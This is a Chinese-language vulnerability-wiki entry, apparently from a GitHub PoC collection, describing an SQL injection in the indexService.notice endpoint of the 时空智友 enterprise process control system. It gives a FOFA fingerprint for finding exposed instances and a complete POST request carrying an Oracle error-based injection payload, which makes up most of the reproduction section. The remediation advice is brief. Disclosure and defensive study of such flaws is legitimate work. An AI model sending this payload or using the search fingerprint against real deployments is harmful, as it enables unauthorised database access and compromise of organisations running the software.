---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 时空智友企业流程化管控系统 indexService.notice 存在SQL注入

# 漏洞描述

时空智友企业流程化管控系统 indexService.notice 存在SQL注入，未授权攻击者可进行任意命令执行，查询数据库相关内容等。

# 影响版本

时空智友企业流程化管控系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="继续登录将挤掉原登录设备"

POC/EXP：

POST /formservice?service=indexService.notice HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

{"id":"1' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))-- fKEk"}

![image-20250307111731627](./.resource/时空智友企业流程化管控系统indexService.notice存在SQL注入/media/image-20250307111731627.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
